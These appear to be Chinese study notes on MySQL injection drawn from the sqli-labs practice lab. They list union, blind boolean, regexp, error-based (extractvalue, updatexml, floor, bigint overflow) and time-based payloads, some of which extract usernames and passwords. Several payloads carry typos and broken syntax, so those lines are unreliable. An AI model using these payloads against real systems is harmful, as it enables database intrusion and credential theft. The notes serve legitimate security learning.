show databases;查询检查一下数据库
选择information_schema来执行命令 use information_schema;
查看一下这个数据库有哪些表 show tables;
再枚举这个表 desc tables;
sql注入的基础知识
默认定义了information_schema数据库，存储数据库元信息，schemata(数据库名)，tables(表名),columns(列名或字段名)
在schemata表中，schemata_name字段用来存储数据库名
在table表中，table_schema和table_name分别用来存储数据库名和表名
在columns表，table_schema(数据库名)，table_name(表名)，column_name(表名)
select 列名称 from 表名称 where 字段1='条件1' and 字段2='条件2'
insert into table name(列1，列2） values(值1，值2)
update 表名称 set 列名称=新值 where 列名称=某值
delete from 表名称 where 列名称=某值
user():查看当前myswql登入用户名
database():查看当前使用的数据库
version():查看当前使用的版本
limit n,m:=
SQL注入类型：数字和字符型 表中存在id字段的才可以使用，通过url中修改对应的id值为正常数字，大数字，字符（单双引号，双单引号，括号），反斜杠\探测url是否存在注入点、
数字型：select *from table where id=用户输入id
字符型：select *from table where id='字符型'
判断注入点：参数可控对数据是否产生影响有影响可能是注入点
一：GET基于报错的SQL注入：通过url中修改对应的id值为正常数字，大数字，字符（单双引号，双单引号，括号），反斜杠\探测url是否存在注入点
加？相当于直接默认到index.php上
 ''14'' LIMIT 0,1' 中'14'' LIMIT 0,1
 推断基于单引号的报错：select  login_name,password from admin where id='id' limit 0,1
  '' LIMIT 0,1' 中' LIMIT 0,1
 基于数字的报错：select  login_name,password from admin where id=id limit 0,1
 ''1'') LIMIT 0,1'中'1'') LIMIT 0,1
 基于单引号括号之间的报错：select  login_name,password from admin where id=('id') limit 0,1
 '"1\") LIMIT 0,1'中"1\") LIMIT 0,1
 基于双引号之间的报错：select  login_name,password from admin where id=("id") limit 0,1
 二：GET基于报错的sql注入利用
 1.利用order by判断字段数
 2.利用union select联合查询，获取表名：0'union select 1,group_concat(table_name),3 from information_schema.tables where table_schemata=database()--+
 3.利用union select联合查询，获取字段名：0'union select 1,group_concat(columns_name),3 from information_schema.tables where=table_schemata='users'--+
 4.利用union select联合查询，获取字段值：0'union select 1,group_concat(columns_name),3 from users--+
 %27=‘ %20=空格
 backgroup盲注的讲解
 一.判断数据库长度
 1'and lenth(database())>1--+
 二.判断第一个字符
 1'and ascii(substr(database(),1,1))>97--+
 三.判断数据库中表的数量
 1'and (select count(table_name) from information_schema.tables where table_schema='security')>3--+
 四.判断第一个表的长度
 1'and length(select table_name from information_schema.tables where table_schema='security'limit 0,1)>3--+
 五.第一个表的名字
 1'and ascii(substr((select table_name from information_schema.tables where table_schema='security'limit 0,1),1,1) )>97--+
 六.判断一个表的字段数量
 1'and (select count(column_name) from information_schema.tables where table_name='users')>3--+
 七.判断这个表的第一个字段名
 1'and ascii(subsetr((select column_name from information_schema.columns where table_schema='security' and table_name='users'limit 0,1),1,1))>97--+
 八.判断第一条数据的字段内容长度
 1'and length(select password from users limit 0,1)>3--+
 九.判断第一条数据的字段内容
 1'ascii(substr(select password from users limit 0,1))>97--+
 %3e=大于 0x20=t
 正则注入
 ord()函数返回第一个字符的ascii值如ord(mid(database(),1,1))>114意义第一位的ascii值是否大于114
 less-5
 1.查版本号 1'and left(version())=5--+
 2.查数据库长度 1'and length(database())>4--+
 3.猜测数据库的第一位1'and left(database(),1)='s'--+
 4.利用ascii和substr获取数据库表的第一位 1'and ascii(substr((select table_name from information_schema.tables where table_schema='security' limit0,1),1,1))=101--+
 5.利用regexp获取表中的列1'and 1=(select 1 from information_schema.columns where table_name='users' and table_name regexp'^us[a-z]'limit 0,1)--+
 6.选择users表中的列名是否有us** 1'and 1=(select 1 from information_schema.columns where table_name='users' and table_name regexp'^username' limit 0.1)--+
 7.利用ord()和mid()函数获取users表的内容,获取username表的第一行第一个字符：1'and ord(mid((select ifnull(cast(username as char),0x20)from security.users order by id limit 0,1),1,1))=68--+
 7.ord()将第一个字符转换为ascii码
 if(expr1,2,3),ifnull(expr1,expr2)如果不是空返回expr1,否则返回expr2如infull(null,'aa')返回aa
 cast(expression as data_type)将expression转换为data_type类 data_type常为char
 ord()
 报错注入
 为什么报错注入？
 在实际场景中如果没有一个合适的数据返回点，而是仅仅带入sql数据库查询，就需要报错注入 select*from users where id='id'limit0,1 正常进行绕过，但是less5没有数据回显，断定为报错注入
 1.extractvalue
 and extractvalue(null,concat(0x7e,(sql_inject),0x7e))
 可以理解为，让后台xml故意报错，0x7e=~,利用这种方式，对后台进行一个排序，指定第一个参数为Null,让它故意报错，将第二个参数带入数据库执行，最后报错显示执行的结果 
 1'and extractvalue(null,concat(0x7e,(select database()),0x7e))--+ 返回： XPATH syntax error: '~security~
 进一步获取表名列名，数据
 union select，在报错注入情况下，我们只能去使用select而非union select,他们的语句执行有什么区别？
 获取表名：union select 1,group_concat(table_name) ,3 from information_schema.tables where table_schema='security'
 select table_name from information_schema.tables where table_schema='security' 返回 Subquery returns more than 1 row 处理使用limit:数据库中的排序 limit 0,1表格中数据第一项后面爆破数据
 2.updatexml
 and 1=(updatexml(1,concat(0x7e,(sql_inject)),1))
这个函数用来更新xml数据的，但是我们非法传参，使它故意报错，执行我们的sql语句，0x7e是~用来区分数据
报错的floor():and select 1 from(select count(*),concat(database(),floor(rand(0)*2))x from information_schema.tables group by x)a)
原理分析floor()
rand()随机产生0-1数，加参数固定值，count(*)计算有多少列，group by分组，虚拟表：没有插入操作加一,floor()向下取整，通过floor(rand(0)*2)结果只有0和1，select count*,floor
(rand(0)*2) from floortest group by floor当执行插入操作的时候rand(0)又被执行一次，operand should contain 1columns操作数应该包含一列，select count(*),floor(rand(0)*2)x from information_schema.tables查询出来的是一个结果表 要为布尔值所以select 1
every derived table must have its own alias每个派生表必须有自己的别名：id=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x))改为id=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a)
duplicate entry重复的条目
如何floor联合报错的：进行group by floor(rand(0)*2),floor表达式第一次运算的值为0，在插入的过程中需要再取一次group by后面的值，取到1并插入 注意：语法顺序
double数值类型溢出原理
%2b=+,exp与in和log的功能相反，指数函数为对数函数的反函数，exp()即为e为底的对数函数
bigint溢出错误的sql注入，利用其溢出，从而设法提取数据，如果一个查询成功返回，其返回值为0，对逻辑非得话为1
select(select *from (select user())x)返回root@localhost ,!(select*from(select user())x)返回1
获取表名：!(select*from(select table_name from information_schema.tables where tables_schema=database()limit 0,1)x)-~0
获取列名：!(select*from(select column_name from information_schema.columns where table_schema='users'limit 0,1)x)-~0;
检索数据:!(select*from(select concat_ws(':',username,password)from users limit 0,1)x)-~0
延时注入：benchmark()重复执行某表达式
select benchmark(count,expr)是重复执行count次expr表达式，使得处理的时间很长
 
